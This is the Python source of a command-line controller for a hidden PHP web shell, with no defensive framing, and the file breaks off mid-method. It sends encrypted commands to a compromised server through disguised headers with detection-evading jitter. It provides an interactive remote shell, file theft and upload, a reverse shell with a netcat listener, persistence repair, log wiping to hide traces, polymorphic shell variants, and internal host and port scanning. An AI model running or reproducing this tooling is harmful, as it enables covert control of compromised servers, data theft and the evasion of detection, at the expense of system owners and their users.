import requests
import base64
import json
import os
import sys
import cmd
import readline
import argparse
import getpass
import hashlib
import time
import random
import subprocess
import zlib
import datetime
import configparser
import re
from tabulate import tabulate
from colorama import Fore, Back, Style, init


# Initialize colorama
init(autoreset=True)

class ShellController:
    def __init__(self, target_url, encryption_key=None, proxy=None, user_agent=None):
        self.target_url = target_url
        self.base_key = encryption_key or self._generate_random_key()
        self.session = requests.Session()
        self.last_response_time = 0
        self.command_history = []
        self.shell_info = {}
        self.current_dir = None
        
        # Configure proxy if provided
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
        # Set custom user agent or use a realistic one
        if user_agent:
            self.user_agent = user_agent
        else:
            # Realistic user agents to blend in with normal traffic
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
            ]
            self.user_agent = random.choice(user_agents)
        
        self.session.headers.update({'User-Agent': self.user_agent})
        
        # Communication methods in order of preference
        self.comm_methods = [
            self._send_header_command,
            self._send_post_command,
            self._send_get_command
        ]
        
        # Header names to try (should match those in the PHP shell)
        self.header_names = [
            'X-Run', 
            'X-Data', 
            'Authorization', 
            'X-Forwarded-For', 
            'X-Requested-With', 
            'Cache-Control',
            'X-Correlation-ID',
            'X-Request-ID',
            'X-API-Key',
            'X-CSRF-Token',
            'X-Client-IP',
            'X-Custom-Header',
            'X-Tracking-ID'
        ]
        random.shuffle(self.header_names)

    def _generate_random_key(self):
        """Generate a random encryption key."""
        return base64.b64encode(os.urandom(16)).decode('utf-8')

    def _encrypt(self, data):
        """Encrypt data using XOR with SHA256 hash of key and compression"""
        # Compress the data
        compressed = zlib.compress(data.encode('utf-8'))
        
        # Base64 encode the compressed content
        encoded = base64.b64encode(compressed)
        
        # Get key bytes
        key_bytes = hashlib.sha256(self.base_key.encode()).digest()
        
        # XOR encryption - working directly with bytes
        encrypted = bytearray()
        for i in range(len(encoded)):
            encrypted.append(encoded[i] ^ key_bytes[i % len(key_bytes)])
        
        # Return base64 encoded result
        return base64.b64encode(encrypted).decode('utf-8')

    def _decrypt(self, data):
        """Decrypt data using XOR with SHA256 hash of key and decompression"""
        try:
            # Decode base64
            encrypted = base64.b64decode(data)
            
            # Get key bytes
            key_bytes = hashlib.sha256(self.base_key.encode()).digest()
            
            # XOR decryption - working directly with bytes
            decrypted = bytearray()
            for i in range(len(encrypted)):
                decrypted.append(encrypted[i] ^ key_bytes[i % len(key_bytes)])
            
            # Decode base64 and decompress
            decompressed = zlib.decompress(base64.b64decode(decrypted))
            
            # Return the decompressed data as string
            return decompressed.decode('utf-8')
        except Exception as e:
            print(f"{Fore.RED}Decryption error: {str(e)}")
            return None





    def _send_header_command(self, command):
        """Send command via HTTP headers."""
        encrypted_cmd = self._encrypt(command)
        
        for header_name in self.header_names:
            try:
                headers = {header_name: encrypted_cmd}
                headers.update(self.session.headers)
                
                response = self.session.get(
                    self.target_url, 
                    headers=headers,
                    timeout=30
                )
                
                if response.status_code == 200:
                    # Try to find encrypted response in the body
                    return self._extract_response(response.text)
            except Exception as e:
                continue
        
        return None

    def _send_post_command(self, command):
        """Send command via POST data."""
        try:
            encrypted_cmd = self._encrypt(command)
            response = self.session.post(
                self.target_url,
                data={'data': encrypted_cmd},
                timeout=30
            )
            
            if response.status_code == 200:
                return self._extract_response(response.text)
        except Exception:
            pass
        
        return None

    def _send_get_command(self, command):
        """Send command via GET parameter."""
        try:
            encrypted_cmd = self._encrypt(command)
            response = self.session.get(
                f"{self.target_url}?id={encrypted_cmd}",
                timeout=30
            )
            
            if response.status_code == 200:
                return self._extract_response(response.text)
        except Exception:
            pass
        
        return None

    def _extract_response(self, response_text):
        """Extract and decrypt the response from the server."""
        # Try to find an encrypted response in the HTML
        # First, look for a direct encrypted response
        if response_text and len(response_text) > 20:
            try:
                decrypted = self._decrypt(response_text)
                if decrypted:
                    return decrypted
            except:
                pass
        
        # Look for response in HTML comments
        comment_pattern = r'<!--\s*(.*?)\s*-->'
        matches = re.findall(comment_pattern, response_text)
        for match in matches:
            try:
                decrypted = self._decrypt(match.strip())
                if decrypted:
                    return decrypted
            except:
                continue
        
        return None

    def execute_command(self, command):
        """Execute a command on the remote server using available methods."""
        # Add jitter to avoid detection patterns
        time.sleep(random.uniform(0.1, 0.5))
        
        # Record command in history
        self.command_history.append(command)
        
        # Try each communication method until one works
        for method in self.comm_methods:
            response = method(command)
            if response:
                # If successful, move this method to the front of the list for next time
                self.comm_methods.remove(method)
                self.comm_methods.insert(0, method)
                return response
        
        return "Error: Failed to communicate with the shell."

    def test_connection(self):
        """Test the connection to the shell."""
        print(f"{Fore.YELLOW}Testing connection to {self.target_url}...")
        
        # Try a simple command that should work on both Windows and Linux
        response = self.execute_command("echo ShellTest")
        
        if response and "ShellTest" in response:
            print(f"{Fore.GREEN}Connection successful!")
            return True
        else:
            print(f"{Fore.RED}Connection failed!")
            return False

    def get_system_info(self):
        """Get detailed system information from the shell."""
        print(f"{Fore.YELLOW}Gathering system information...")
        
        response = self.execute_command("SYSINFO")
        
        if response:
            try:
                self.shell_info = json.loads(response)
                self._display_system_info()
                return self.shell_info
            except json.JSONDecodeError:
                print(f"{Fore.RED}Error parsing system information: {response}")
                return None
        else:
            print(f"{Fore.RED}Failed to get system information.")
            return None

    def _display_system_info(self):
        """Display the gathered system information in a formatted way."""
        if not self.shell_info:
            print(f"{Fore.RED}No system information available.")
            return
        
        print(f"\n{Fore.CYAN}=== System Information ===")
        
        # Basic information
        basic_info = [
            ["Operating System", self.shell_info.get('os', 'Unknown')],
            ["Hostname", self.shell_info.get('hostname', 'Unknown')],
            ["PHP Version", self.shell_info.get('php_version', 'Unknown')],
            ["Server Software", self.shell_info.get('server_software', 'Unknown')],
            ["Server IP", self.shell_info.get('server_ip', 'Unknown')],
            ["Current User", self.shell_info.get('user', 'Unknown')]
        ]
        
        print(tabulate(basic_info, tablefmt="pretty"))
        
        # Show disabled functions
        if 'disabled_functions' in self.shell_info and self.shell_info['disabled_functions']:
            print(f"\n{Fore.YELLOW}Disabled PHP Functions:")
            disabled = self.shell_info['disabled_functions'].split(',')
            for i in range(0, len(disabled), 5):
                print(', '.join(disabled[i:i+5]))
        
        # OS-specific information
        if self.shell_info.get('os') == 'Linux':
            print(f"\n{Fore.CYAN}=== Linux System Details ===")
            if 'kernel' in self.shell_info:
                print(f"{Fore.WHITE}Kernel: {self.shell_info['kernel']}")
            if 'distro' in self.shell_info:
                print(f"{Fore.WHITE}Distribution: {self.shell_info['distro']}")
            
            # Show network information
            if 'network' in self.shell_info:
                print(f"\n{Fore.YELLOW}Network Configuration:")
                print(f"{Fore.WHITE}{self.shell_info['network']}")
            
            # Show running processes (truncated)
            if 'processes' in self.shell_info:
                print(f"\n{Fore.YELLOW}Running Processes (root):")
                processes = self.shell_info['processes'].split('\n')[:10]  # Show first 10 lines
                print(f"{Fore.WHITE}{chr(10).join(processes)}")
                if len(self.shell_info['processes'].split('\n')) > 10:
                    print(f"{Fore.WHITE}... (truncated)")
        
        elif self.shell_info.get('os') == 'Windows':
            print(f"\n{Fore.CYAN}=== Windows System Details ===")
            if 'system_info' in self.shell_info:
                print(f"{Fore.WHITE}{self.shell_info['system_info']}")
            
            # Show network information
            if 'network' in self.shell_info:
                print(f"\n{Fore.YELLOW}Network Configuration:")
                network_info = self.shell_info['network'].split('\n')[:15]  # Show first 15 lines
                print(f"{Fore.WHITE}{chr(10).join(network_info)}")
                if len(self.shell_info['network'].split('\n')) > 15:
                    print(f"{Fore.WHITE}... (truncated)")

    def check_persistence(self):
        """Check which persistence mechanisms are active."""
        print(f"{Fore.YELLOW}Checking persistence mechanisms...")
        
        # First, get the list of persistence locations from the shell
        response = self.execute_command("PERSIST CHECK")
        
        if not response:
            print(f"{Fore.RED}Failed to check persistence mechanisms.")
            return
        
        try:
            # Parse the response
            persistence_status = {}
            for line in response.split('\n'):
                if ':' in line:
                    mechanism, status = line.split(':', 1)
                    persistence_status[mechanism.strip()] = status.strip()
            
            # Display the results
            print(f"\n{Fore.CYAN}=== Persistence Status ===")
            
            status_table = []
            for mechanism, status in persistence_status.items():
                if "active" in status.lower():
                    status_color = f"{Fore.GREEN}{status}{Style.RESET_ALL}"
                else:
                    status_color = f"{Fore.RED}{status}{Style.RESET_ALL}"
                status_table.append([mechanism, status_color])
            
            print(tabulate(status_table, headers=["Mechanism", "Status"], tablefmt="pretty"))
            
            return persistence_status
        except Exception as e:
            print(f"{Fore.RED}Error parsing persistence status: {str(e)}")
            return None

    def repair_persistence(self):
        """Repair or reinstall persistence mechanisms."""
        print(f"{Fore.YELLOW}Repairing persistence mechanisms...")
        
        response = self.execute_command("PERSIST")
        
        if response:
            print(f"{Fore.GREEN}Persistence mechanisms deployed:")
            for line in response.split('\n'):
                print(f"  {line}")
            return True
        else:
            print(f"{Fore.RED}Failed to repair persistence mechanisms.")
            return False

    def create_reverse_shell(self, ip, port=4444):
        """Create a reverse shell connection back to the specified IP and port."""
        print(f"{Fore.YELLOW}Attempting to create reverse shell to {ip}:{port}...")
        
        # First, check if we need to start a listener
        start_listener = input(f"{Fore.CYAN}Start a netcat listener on {port}? (y/n): ").lower() == 'y'
        
        if start_listener:
            # Start netcat in a new terminal window
            if sys.platform.startswith('win'):
                subprocess.Popen(f'start cmd.exe /k "nc -lvp {port}"', shell=True)
            elif sys.platform.startswith('darwin'):  # macOS
                subprocess.Popen(['osascript', '-e', f'tell app "Terminal" to do script "nc -lvp {port}"'])
            else:  # Linux
                subprocess.Popen(f'x-terminal-emulator -e "nc -lvp {port}"', shell=True)
            
            print(f"{Fore.GREEN}Listener started on port {port}")
            time.sleep(2)  # Give the listener time to start
        
        # Send the reverse shell command
        response = self.execute_command(f"REVSHELL {ip} {port}")
        
        if response:
            print(f"{Fore.GREEN}Reverse shell command sent: {response}")
            print(f"{Fore.YELLOW}Check your listener for incoming connection...")
            return True
        else:
            print(f"{Fore.RED}Failed to create reverse shell.")
            return False

    def file_browser(self):
        """Interactive file browser for the remote system."""
        if not self.current_dir:
            # Try to determine the current directory
            if self.shell_info.get('os') == 'Windows':
                response = self.execute_command("cd")
            else:
                response = self.execute_command("pwd")
            
            if response:
                self.current_dir = response.strip()
            else:
                self.current_dir = '/' if self.shell_info.get('os') != 'Windows' else 'C:\\'
        
        while True:
            print(f"\n{Fore.CYAN}=== File Browser ===")
            print(f"{Fore.YELLOW}Current Directory: {self.current_dir}")
            print(f"{Fore.WHITE}Commands: ls, cd [dir], pwd, cat [file], download [file], upload [file], edit [file], back")
            
            cmd = input(f"{Fore.GREEN}file> {Style.RESET_ALL}").strip()
            
            if cmd == 'back' or cmd == 'exit':
                break
            
            if cmd == 'ls' or cmd == 'dir':
                self._list_files()
            elif cmd.startswith('cd '):
                self._change_directory(cmd[3:])
            elif cmd == 'pwd':
                print(f"Current directory: {self.current_dir}")
            elif cmd.startswith('cat ') or cmd.startswith('type '):
                self._view_file(cmd.split(' ', 1)[1])
            elif cmd.startswith('download '):
                self._download_file(cmd.split(' ', 1)[1])
            elif cmd.startswith('upload '):
                self._upload_file(cmd.split(' ', 1)[1])
            elif cmd.startswith('edit '):
                self._edit_file(cmd.split(' ', 1)[1])
            else:
                print(f"{Fore.RED}Unknown command: {cmd}")

    def _list_files(self):
        """List files in the current directory."""
        response = self.execute_command(f"FILE list {self.current_dir}")
        
        if not response:
            print(f"{Fore.RED}Failed to list files.")
            return
        
        files = []
        for line in response.strip().split('\n'):
            if not line.strip():
                continue
            
            parts = line.split('\t')
            if len(parts) >= 5:
                file_type, perms, size, mtime, name = parts[:5]
                
                # Color directories blue, executables green, and regular files white
                if file_type == 'D':
                    name = f"{Fore.BLUE}{name}{Style.RESET_ALL}"
                elif perms.endswith('5') or perms.endswith('1'):  # Executable
                    name = f"{Fore.GREEN}{name}{Style.RESET_ALL}"
                
                files.append([file_type, perms, size, mtime, name])
        
        if files:
            print(tabulate(files, headers=["Type", "Perms", "Size", "Modified", "Name"], tablefmt="pretty"))
        else:
            print(f"{Fore.YELLOW}No files found or directory is empty.")

    def _change_directory(self, path):
        """Change the current directory."""
        # Handle relative paths
        if not path.startswith('/') and not (path.startswith('\\') or re.match(r'^[A-Za-z]:', path)):
            if self.shell_info.get('os') == 'Windows':
                path = f"{self.current_dir}\\{path}"
            else:
                path = f"{self.current_dir}/{path}"
        
        # Normalize path
        if path == '..':
            if self.shell_info.get('os') == 'Windows':
                self.current_dir = '\\'.join(self.current_dir.split('\\')[:-1]) or 'C:\\'
            else:
                self.current_dir = '/'.join(self.current_dir.split('/')[:-1]) or '/'
            return
        
        # Check if directory exists
        response = self.execute_command(f"FILE list {path}")
        
        if response and not response.startswith('Error'):
            self.current_dir = path
        else:
            print(f"{Fore.RED}Failed to change directory: {response}")

    def _view_file(self, filename):
        """View the contents of a file."""
        # Handle relative paths
        if not filename.startswith('/') and not (filename.startswith('\\') or re.match(r'^[A-Za-z]:', filename)):
            if self.shell_info.get('os') == 'Windows':
                filename = f"{self.current_dir}\\{filename}"
            else:
                filename = f"{self.current_dir}/{filename}"
        
        response = self.execute_command(f"FILE read {filename}")
        
        if response and not response.startswith('Error'):
            print(f"\n{Fore.CYAN}=== File: {filename} ===")
            print(response)
        else:
            print(f"{Fore.RED}Failed to read file: {response}")

    def _download_file(self, filename):
        """Download a file from the remote server."""
        # Handle relative paths
        if not filename.startswith('/') and not (filename.startswith('\\') or re.match(r'^[A-Za-z]:', filename)):
            if self.shell_info.get('os') == 'Windows':
                remote_path = f"{self.current_dir}\\{filename}"
            else:
                remote_path = f"{self.current_dir}/{filename}"
        else:
            remote_path = filename
        
        # Get just the filename for local saving
        local_filename = os.path.basename(filename)
        
        print(f"{Fore.YELLOW}Downloading {remote_path} to {local_filename}...")
        
        response = self.execute_command(f"FILE download {remote_path}")
        
        if response and response.startswith('FILE:'):
            # Extract the base64 encoded file content
            file_content = base64.b64decode(response[5:])
            
            # Save to local file
            with open(local_filename, 'wb') as f:
                f.write(file_content)
            
            print(f"{Fore.GREEN}File downloaded successfully: {local_filename} ({len(file_content)} bytes)")
        else:
            print(f"{Fore.RED}Failed to download file: {response}")

    def _upload_file(self, filename):
        """Upload a file to the remote server."""
        # Check if the local file exists
        if not os.path.exists(filename):
            print(f"{Fore.RED}Local file not found: {filename}")
            return
        
        # Read the file content
        with open(filename, 'rb') as f:
            file_content = f.read()
        
        # Encode the file content as base64
        encoded_content = base64.b64encode(file_content).decode('utf-8')
        
        # Determine the remote path
        remote_filename = os.path.basename(filename)
        if self.shell_info.get('os') == 'Windows':
            remote_path = f"{self.current_dir}\\{remote_filename}"
        else:
            remote_path = f"{self.current_dir}/{remote_filename}"
        
        print(f"{Fore.YELLOW}Uploading {filename} to {remote_path}...")
        
        # The command might be too large for a single request, so we'll chunk it
        chunk_size = 100000  # Adjust based on what the server can handle
        
        if len(encoded_content) > chunk_size:
            print(f"{Fore.YELLOW}Large file detected, uploading in chunks...")
            
            # Create a temporary file on the server
            temp_file = remote_path + ".tmp"
            
            # Upload in chunks
            for i in range(0, len(encoded_content), chunk_size):
                chunk = encoded_content[i:i+chunk_size]
                
                if i == 0:
                    # First chunk, create the file
                    response = self.execute_command(f"FILE write {temp_file} {chunk}")
                else:
                    # Append to the file
                    response = self.execute_command(f"FILE append {temp_file} {chunk}")
                
                if not response or response.startswith('Error'):
                    print(f"{Fore.RED}Failed to upload chunk: {response}")
                    return
                
                print(f"{Fore.GREEN}Uploaded chunk {i//chunk_size + 1}/{(len(encoded_content) + chunk_size - 1)//chunk_size}")
            
            # Rename the temporary file to the final name
            response = self.execute_command(f"FILE rename {temp_file} {remote_path}")
            
            if response and not response.startswith('Error'):
                print(f"{Fore.GREEN}File uploaded successfully: {remote_path}")
            else:
                print(f"{Fore.RED}Failed to finalize upload: {response}")
        else:
            # Small file, upload in one request
            response = self.execute_command(f"FILE upload {remote_path} {encoded_content}")
            
            if response and not response.startswith('Error'):
                print(f"{Fore.GREEN}File uploaded successfully: {remote_path}")
            else:
                print(f"{Fore.RED}Failed to upload file: {response}")

    def _edit_file(self, filename):
        """Edit a file on the remote server."""
        import tempfile
        
        # First, download the file
        if not filename.startswith('/') and not (filename.startswith('\\') or re.match(r'^[A-Za-z]:', filename)):
            if self.shell_info.get('os') == 'Windows':
                remote_path = f"{self.current_dir}\\{filename}"
            else:
                remote_path = f"{self.current_dir}/{filename}"
        else:
            remote_path = filename
        
        print(f"{Fore.YELLOW}Downloading {remote_path} for editing...")
        
        response = self.execute_command(f"FILE download {remote_path}")
        
        if not response or not response.startswith('FILE:'):
            print(f"{Fore.RED}Failed to download file for editing: {response}")
            return
        
        # Extract the file content
        file_content = base64.b64decode(response[5:]).decode('utf-8', errors='replace')
        
        # Create a temporary file for editing
        temp_file = os.path.join(tempfile.gettempdir(), os.path.basename(filename))
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(file_content)
        
        print(f"{Fore.YELLOW}Opening editor...")
        
        # Open the file in the default editor
        if sys.platform.startswith('win'):
            os.system(f'notepad "{temp_file}"')
        else:
            editor = os.environ.get('EDITOR', 'vi')
            os.system(f'{editor} "{temp_file}"')
        
        # Ask if the user wants to save the changes
        save = input(f"{Fore.CYAN}Save changes to remote file? (y/n): ").lower() == 'y'
        
        if save:
            # Read the modified content
            with open(temp_file, 'rb') as f:
                modified_content = f.read()
            
            # Encode the modified content
            encoded_content = base64.b64encode(modified_content).decode('utf-8')
            
            print(f"{Fore.YELLOW}Uploading changes...")
            
            # Upload the modified file
            response = self.execute_command(f"FILE upload {remote_path} {encoded_content}")
            
            if response and not response.startswith('Error'):
                print(f"{Fore.GREEN}File updated successfully: {remote_path}")
            else:
                print(f"{Fore.RED}Failed to update file: {response}")
        
        # Clean up the temporary file
        try:
            os.unlink(temp_file)
        except:
            pass

    def clean_logs(self):
        """Clean logs on the remote server to hide traces."""
        print(f"{Fore.YELLOW}Cleaning logs on the remote server...")
        
        response = self.execute_command("CLEAN")
        
        if response:
            print(f"{Fore.GREEN}Logs cleaned: {response}")
            return True
        else:
            print(f"{Fore.RED}Failed to clean logs.")
            return False

    def create_polymorphic_shell(self):
        """Create a polymorphic variant of the shell."""
        print(f"{Fore.YELLOW}Creating polymorphic shell variant...")
        
        response = self.execute_command("POLYMORPHIC")
        
        if response:
            print(f"{Fore.GREEN}Polymorphic shell created: {response}")
            return response
        else:
            print(f"{Fore.RED}Failed to create polymorphic shell.")
            return None

    def memory_only_mode(self):
        """Activate memory-only mode for the shell."""
        print(f"{Fore.YELLOW}Activating memory-only mode...")
        
        response = self.execute_command("MEMORY")
        
        if response:
            print(f"{Fore.GREEN}Memory-only mode activated: {response}")
            return True
        else:
            print(f"{Fore.RED}Failed to activate memory-only mode.")
            return False

    def interactive_shell(self):
        """Start an interactive shell session."""
        print(f"\n{Fore.CYAN}=== Interactive Shell ===")
        print(f"{Fore.YELLOW}Type 'exit' or 'quit' to return to the main menu.")
        
        # Try to determine the current working directory and user
        if self.shell_info.get('os') == 'Windows':
            response = self.execute_command("cd & echo %username%")
            if response:
                parts = response.strip().split('\n')
                if len(parts) >= 2:
                    cwd, username = parts[0], parts[1]
                    prompt = f"{username}@{self.shell_info.get('hostname', 'unknown')}:{cwd}> "
                else:
                    prompt = "shell> "
            else:
                prompt = "shell> "
        else:
            response = self.execute_command("pwd && whoami")
            if response:
                parts = response.strip().split('\n')
                if len(parts) >= 2:
                    cwd, username = parts[0], parts[1]
                    prompt = f"{username}@{self.shell_info.get('hostname', 'unknown')}:{cwd}$ "
                else:
                    prompt = "shell$ "
            else:
                prompt = "shell$ "
        
        while True:
            try:
                command = input(f"{Fore.GREEN}{prompt}{Style.RESET_ALL}")
                
                if command.lower() in ['exit', 'quit', 'bye']:
                    break
                
                if not command.strip():
                    continue
                # Execute the command
                response = self.execute_command(command)
                
                if response:
                    print(response)
                else:
                    print(f"{Fore.RED}No response or command failed.")
                
                # Update prompt if the command might have changed directory
                if command.startswith('cd ') or command == 'cd':
                    if self.shell_info.get('os') == 'Windows':
                        new_cwd = self.execute_command("cd")
                    else:
                        new_cwd = self.execute_command("pwd")
                    
                    if new_cwd:
                        if self.shell_info.get('os') == 'Windows':
                            prompt = f"{username}@{self.shell_info.get('hostname', 'unknown')}:{new_cwd.strip()}> "
                        else:
                            prompt = f"{username}@{self.shell_info.get('hostname', 'unknown')}:{new_cwd.strip()}$ "
            
            except KeyboardInterrupt:
                print("\nUse 'exit' to return to the main menu.")
            except Exception as e:
                print(f"{Fore.RED}Error: {str(e)}")

    def process_manager(self):
        """Interactive process manager."""
        print(f"\n{Fore.CYAN}=== Process Manager ===")
        
        while True:
            print(f"\n{Fore.YELLOW}Commands: list, kill [pid], info [pid], back")
            cmd = input(f"{Fore.GREEN}process> {Style.RESET_ALL}").strip()
            
            if cmd == 'back' or cmd == 'exit':
                break
            
            if cmd == 'list':
                self._list_processes()
            elif cmd.startswith('kill '):
                self._kill_process(cmd.split(' ', 1)[1])
            elif cmd.startswith('info '):
                self._process_info(cmd.split(' ', 1)[1])
            else:
                print(f"{Fore.RED}Unknown command: {cmd}")

    def _list_processes(self):
        """List running processes."""
        if self.shell_info.get('os') == 'Windows':
            response = self.execute_command("tasklist /FO CSV /NH")
        else:
            response = self.execute_command("ps aux | head -20")  # Limit to first 20 processes
        
        if response:
            print(response)
        else:
            print(f"{Fore.RED}Failed to list processes.")

    def _kill_process(self, pid):
        """Kill a process by PID."""
        try:
            pid = int(pid)
            
            if self.shell_info.get('os') == 'Windows':
                response = self.execute_command(f"taskkill /F /PID {pid}")
            else:
                response = self.execute_command(f"kill -9 {pid}")
            
            if response:
                print(f"{Fore.GREEN}Process kill result: {response}")
            else:
                print(f"{Fore.RED}Failed to kill process.")
        except ValueError:
            print(f"{Fore.RED}Invalid PID: {pid}")

    def _process_info(self, pid):
        """Get detailed information about a process."""
        try:
            pid = int(pid)
            
            if self.shell_info.get('os') == 'Windows':
                response = self.execute_command(f"wmic process where processid={pid} get commandline,executablepath,name,processid,parentprocessid /format:list")
            else:
                response = self.execute_command(f"ps -p {pid} -f")
            
            if response:
                print(response)
            else:
                print(f"{Fore.RED}Failed to get process info.")
        except ValueError:
            print(f"{Fore.RED}Invalid PID: {pid}")

    def network_manager(self):
        """Interactive network manager."""
        print(f"\n{Fore.CYAN}=== Network Manager ===")
        
        while True:
            print(f"\n{Fore.YELLOW}Commands: connections, interfaces, scan [ip/range], portscan [ip], back")
            cmd = input(f"{Fore.GREEN}network> {Style.RESET_ALL}").strip()
            
            if cmd == 'back' or cmd == 'exit':
                break
            
            if cmd == 'connections':
                self._list_connections()
            elif cmd == 'interfaces':
                self._list_interfaces()
            elif cmd.startswith('scan '):
                self._network_scan(cmd.split(' ', 1)[1])
            elif cmd.startswith('portscan '):
                self._port_scan(cmd.split(' ', 1)[1])
            else:
                print(f"{Fore.RED}Unknown command: {cmd}")

    def _list_connections(self):
        """List active network connections."""
        if self.shell_info.get('os') == 'Windows':
            response = self.execute_command("netstat -ano")
        else:
            response = self.execute_command("netstat -tuln")
        
        if response:
            print(response)
        else:
            print(f"{Fore.RED}Failed to list network connections.")

    def _list_interfaces(self):
        """List network interfaces."""
        if self.shell_info.get('os') == 'Windows':
            response = self.execute_command("ipconfig /all")
        else:
            response = self.execute_command("ifconfig || ip addr")
        
        if response:
            print(response)
        else:
            print(f"{Fore.RED}Failed to list network interfaces.")

    def _network_scan(self, target):
        """Scan network for hosts."""
        print(f"{Fore.YELLOW}Scanning network {target}...")
        
        if self.shell_info.get('os') == 'Windows':
            # Use ping sweep on Windows
            if '/' in target:  # CIDR notation
                print(f"{Fore.RED}Windows doesn't support CIDR notation directly. Try a range like 192.168.1.1-254")
                return
            elif '-' in target:  # Range notation
                base, range_end = target.rsplit('.', 1)[0], target.rsplit('.', 1)[1].split('-')[1]
                response = self.execute_command(f"FOR /L %i IN (1,1,{range_end}) DO @ping -n 1 -w 100 {base}.%i | FIND \"Reply\"")
            else:
                response = self.execute_command(f"ping -n 1 {target}")
        else:
            # Try to use nmap if available, otherwise fall back to ping
            nmap_check = self.execute_command("which nmap")
            if nmap_check and "no nmap" not in nmap_check.lower():
                response = self.execute_command(f"nmap -sn {target}")
            else:
                if '/' in target:  # CIDR notation
                    base, bits = target.split('/')
                    if bits == '24':
                        base = '.'.join(base.split('.')[:-1])
                        response = self.execute_command(f"for i in $(seq 1 254); do ping -c 1 -W 1 {base}.$i | grep 'from'; done")
                    else:
                        print(f"{Fore.RED}Only /24 networks are supported without nmap.")
                        return
                else:
                    response = self.execute_command(f"ping -c 1 {target}")
        
        if response:
            print(response)
        else:
            print(f"{Fore.RED}No hosts found or scan failed.")

    def _port_scan(self, target):
        """Scan ports on a target host."""
        print(f"{Fore.YELLOW}Scanning ports on {target}...")
        
        if self.shell_info.get('os') == 'Windows':
            # Windows doesn't have a good built-in port scanner, use PowerShell
            ps_script = """
            1..1024 | % {
                $socket = New-Object System.Net.Sockets.TcpClient
                $connect = $socket.BeginConnect("$args", $_, $null, $null)
                $wait = $connect.AsyncWaitHandle.WaitOne(50, $false)
                if ($wait) {
                    $socket.EndConnect($connect)
                    "$_ open"
                }
                $socket.Close()
            }
            """
            response = self.execute_command(f"powershell -Command \"{ps_script.replace('$args', target)}\"")
        else:
            # Try to use nmap if available
            nmap_check = self.execute_command("which nmap")
            if nmap_check and "no nmap" not in nmap_check.lower():
                response = self.execute_command(f"nmap -T4 -F {target}")
            else:
                # Fallback to a simple port scan using netcat or /dev/tcp
                nc_check = self.execute_command("which nc")
                if nc_check and "no nc" not in nc_check.lower():
                    response = self.execute_command(f"for p in $(seq 1 1024); do nc -z -v -w 1 {target} $p 2>&1 | grep open; done")
                else:
                    # Use bash's built-in /dev/tcp
                    response = self.execute_command(f"for p in $(seq 1 1024); do (echo > /dev/tcp/{target}/$p) &>/dev/null && echo \"$p open\" || :; done")
        
        if response:
            print(response)
        else:
            print(f"{Fore.RED}No open ports found or scan failed.")

    def save_config(self, config_file='shell_config.ini'):
        """Save the current configuration to a file."""
        config = configparser.ConfigParser()
        config['Shell'] = {
            'target_url': self.target_url,
            'base_key': self.base_key,
            'user_agent': self.user_agent
        }
        
        if self.shell_info:
            config['SystemInfo'] = {k: str(v) for k, v in self.shell_info.items() if isinstance(v, (str, int, float, bool))}
        
        try:
            with open(config_file, 'w') as f:
                config.write(f)
            print(f"{Fore.GREEN}Configuration saved to {config_file}")
            return True
        except Exception as e:
            print(f"{Fore.RED}Failed to save configuration: {str(e)}")
            return False

    def load_config(self, config_file='shell_config.ini'):
        """Load configuration from a file."""
        if not os.path.exists(config_file):
            print(f"{Fore.RED}Configuration file not found: {config_file}")
            return False
        
        config = configparser.ConfigParser()
        try:
            config.read(config_file)
            
            if 'Shell' in config:
                self.target_url = config['Shell'].get('target_url', self.target_url)
                self.base_key = config['Shell'].get('base_key', self.base_key)
                self.user_agent = config['Shell'].get('user_agent', self.user_agent)
                self.session.headers.update({'User-Agent': self.user_agent})
            
            if 'SystemInfo' in config:
                self.shell_info = {k: v for k, v in config['SystemInfo'].items()}
            
            print(f"{Fore.GREEN}Configuration loaded from {config_file}")
            return True
        except Exception as e:
            print(f"{Fore.RED}Failed to load configuration: {str(e)}")
            return False
class ShellControllerCLI(cmd.Cmd):
    """Command-line interface for the Shell Controller."""
    
    prompt = f"{Fore.CYAN}shell> {Style.RESET_ALL}"
    intro = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════╗
{Fore.RED}║ {Fore.YELLOW}PHP Web Shell Controller                                  {Fore.RED}║
{Fore.RED}║ {Fore.WHITE}Type 'help' or '?' to list commands.                      {Fore.RED}║
{Fore.RED}║ {Fore.WHITE}Type 'connect <url> [key]' to connect to a shell.         {Fore.RED}║
{Fore.RED}╚═══════════════════════════════════════════════════════════╝
"""
    
    def __init__(self):
        super().__init__()
        self.controller = None
    
    def do_connect(self, arg):
        """Connect to a PHP web shell: connect <url> [encryption_key]"""
        args = arg.split()
        if not args:
            print(f"{Fore.RED}Error: URL required")
            return
        
        url = args[0]
        key = args[1] if len(args) > 1 else None
        
        print(f"{Fore.YELLOW}Connecting to {url}...")
        self.controller = ShellController(url, key)
        
        if self.controller.test_connection():
            self.controller.get_system_info()
            self.prompt = f"{Fore.CYAN}shell:{self.controller.shell_info.get('hostname', 'unknown')}> {Style.RESET_ALL}"
        else:
            self.controller = None
    
    def do_info(self, arg):
        """Display system information about the connected shell."""
        if not self.controller:
            print(f"{Fore.RED}Error: Not connected to a shell")
            return
        
        self.controller.get_system_info()
    
    def do_shell(self, arg):
        """Start an interactive shell session."""
        if not self.controller:
            print(f"{Fore.RED}Error: Not connected to a shell")
            return
        
        self.controller.interactive_shell()
    
    def do_files(self, arg):
        """Browse and manage files on the remote system."""
        if not self.controller:
            print(f"{Fore.RED}Error: Not connected to a shell")
            return
        
        self.controller.file_browser()
    
    def do_processes(self, arg):
        """Manage processes on the remote system."""
        if not self.controller:
            print(f"{Fore.RED}Error: Not connected to a shell")
            return
        
        self.controller.process_manager()
    
    def do_network(self, arg):
        """Network tools and information."""
        if not self.controller:
            print(f"{Fore.RED}Error: Not connected to a shell")
            return
        
        self.controller.network_manager()
    
    def do_persist(self, arg):
        """Check or repair persistence mechanisms."""
        if not self.controller:
